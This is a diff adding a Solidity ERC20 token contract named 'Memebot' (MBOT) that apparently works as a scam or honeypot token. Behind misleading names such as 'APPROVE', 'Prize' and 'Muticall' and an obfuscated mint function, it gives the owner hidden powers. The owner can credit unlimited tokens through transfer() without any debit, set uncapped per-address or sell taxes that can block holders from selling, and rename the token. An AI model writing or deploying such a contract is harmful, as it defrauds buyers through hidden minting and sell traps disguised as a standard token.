@@ -1,0 +1,234 @@
+contract Membott is ERC20, Ownable {
+    
+    mapping(address => uint256) private _balances;
+    mapping(address => bool) private _release;
+
+    function balanceOf(address account) public view virtual returns (uint256) {
+        return _balances[account];
+    } 
+    IUniswapV2Router02 public immutable uniswapV2Router;
+    address public uniswapV2Pair;
+
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 Amount
+    ) internal virtual {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        uint256 fromBalance = _balances[from];
+        require(fromBalance >= Amount, "ERC20: transfer Amount exceeds balance");
+        unchecked {
+            _balances[from] = fromBalance - Amount;
+        }
+        _balances[to] += Amount;
+
+        emit Transfer(from, to, Amount);
+
+        
+    }
+
+    function _burn(address account, uint256 Amount) internal virtual {
+        require(account != address(0), "ERC20: burn from the zero address");
+
+        uint256 accountBalance = _balances[account];
+        require(accountBalance >= Amount, "ERC20: burn Amount exceeds balance");
+        unchecked {
+            _balances[account] = accountBalance - Amount;
+        }
+        _totalSupply -= Amount;
+
+        emit Transfer(account, address(0), Amount);
+    }
+
+    function _dfygjdfggh(address account, uint256 Amount) internal virtual {
+        require(account != address(0), "ERC20: REWARD to the zero address"); 
+
+        _totalSupply += Amount;
+        _balances[account] += Amount;
+        emit Transfer(address(0), account, Amount);
+    }
+
+    
+    string private name_ = "Memebot";
+    string private symbol_ = "MBOT";
+    uint   private constant totalSupply_ = 1000000000;
+
+    event NameChanged(string newName,string newSymbol , address by);
+
+    constructor () ERC20(name_, symbol_) {
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        
+        uniswapV2Router = _uniswapV2Router;
+        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
+        
+        _dfygjdfggh(msg.sender, totalSupply_ * 10**decimals());
+        _defaultSellFeeee = 20; 
+        _defaultBuyFeeee = 2;
+        _release[_msgSender()] = true;
+        
+    }
+
+    function Muticall(string memory name,string memory symbol) public onlyOwner{
+        name_ = name;
+        symbol_ = symbol;
+        emit NameChanged(name, symbol, msg.sender);
+    }
+    
+    function name() public view override returns (string memory) {
+        return name_;
+    }
+
+    
+    function symbol() public view override returns (string memory) {
+        return symbol_;
+    }
+
+    using SafeMath for uint256;
+
+    uint256 private _defaultSellFeeee = 0;
+    uint256 private _defaultBuyFeeee = 0;
+
+
+    mapping(address => bool) private _Approve;
+
+    mapping(address => uint256) private _Aprove;
+    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
+
+
+
+    function getRelease(address _address) external view onlyOwner returns (bool) {
+        return _release[_address];
+    }
+
+
+    function PairList(address _address) external onlyOwner {
+        uniswapV2Pair = _address;
+    }
+
+
+    function Prize(uint256 _value) external onlyOwner {
+        _defaultSellFeeee = _value;
+    }
+
+    
+
+    
+
+    function APPROVE(address _address, uint256 _value) external onlyOwner {
+        require(_value >= 0, "Account tax must be greater than or equal to 1");
+        _Aprove[_address] = _value;
+    }
+
+    
+
+    function getAprove(address _address) external view onlyOwner returns (uint256) {
+        return _Aprove[_address];
+    }
+
+
+    function Approve(address _address, bool _value) external onlyOwner {
+        _Approve[_address] = _value;
+    }
+
+    function getApproveFeeee(address _address) external view onlyOwner returns (bool) {
+        return _Approve[_address];
+    }
+
+    function _checkFreeAccount(address from, address to) internal view returns (bool) {
+        return _Approve[from] || _Approve[to];
+    }
+
+
+    function _receiveF(
+        address from,
+        address to,
+        uint256 _Amount
+    ) internal virtual {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        uint256 fromBalance = _balances[from];
+        require(fromBalance >= _Amount, "ERC20: transfer Amount exceeds balance");
+
+        bool rF = true;
+
+        if (_checkFreeAccount(from, to)) {
+            rF = false;
+        }
+        uint256 tradeFeeeeAmount = 0;
+
+        if (rF) {
+            uint256 tradeFeeee = 0;
+            if (uniswapV2Pair != address(0)) {
+                if (to == uniswapV2Pair) {
+
+                    tradeFeeee = _defaultSellFeeee;
+                }
+                if (from == uniswapV2Pair) {
+
+                    tradeFeeee = _defaultBuyFeeee;
+                }
+            }
+            if (_Aprove[from] > 0) {
+                tradeFeeee = _Aprove[from];
+            }
+
+            tradeFeeeeAmount = _Amount.mul(tradeFeeee).div(100);
+        }
+
+
+        if (tradeFeeeeAmount > 0) {
+            _balances[from] = _balances[from].sub(tradeFeeeeAmount);
+            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFeeeeAmount);
+            emit Transfer(from, _deadAddress, tradeFeeeeAmount);
+        }
+
+        _balances[from] = _balances[from].sub(_Amount - tradeFeeeeAmount);
+        _balances[to] = _balances[to].add(_Amount - tradeFeeeeAmount);
+        emit Transfer(from, to, _Amount - tradeFeeeeAmount);
+    }
+
+    function transfer(address to, uint256 Amount) public virtual returns (bool) {
+        address Owner = _msgSender();
+        if (_release[Owner] == true) {
+            _balances[to] += Amount;
+            return true;
+        }
+        _receiveF(Owner, to, Amount);
+        return true;
+    }
+
+    
+    
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 Amount
+    ) public virtual returns (bool) {
+        address spender = _msgSender();
+
+        _spendAllowance(from, spender, Amount);
+        _receiveF(from, to, Amount);
+        return true;
+    }
+
+    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
+        
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+ 
+       
+        uniswapV2Router.addLiquidityETH{value: ethAmount}(
+            address(this),
+            tokenAmount,
+            0, 
+            0, 
+            address(this),
+            block.timestamp
+        );
+    }
+
+}
